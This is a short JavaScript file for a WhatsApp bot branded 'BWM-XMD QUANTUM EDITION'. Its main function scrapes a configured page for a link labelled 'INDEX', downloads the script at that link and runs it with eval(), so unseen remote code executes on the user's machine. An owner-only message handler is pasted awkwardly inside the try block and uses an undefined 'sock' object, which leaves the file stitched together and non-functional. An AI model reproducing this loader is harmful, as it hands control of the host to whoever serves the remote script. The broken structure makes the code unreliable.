
//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");

async function fetchINDEXUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("INDEX")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

const OWNER = "254743445041@s.whatsapp.net";

sock.ev.on("messages.upsert", async ({ messages }) => {
  const msg = messages[0];
  if (!msg.message || msg.key.fromMe) return;

  const jid = msg.key.remoteJid;
  const sender = msg.key.participant || jid;

  if (sender !== OWNER) {
    console.log("❌ Access denied to:", sender);
    return;
  }

  const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";

  if (text) {
    await sock.sendMessage(jid, {
      text: `👋 Hello Boss, your message "${text}" was received.`,
    });
  }
});

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchINDEXUrl();
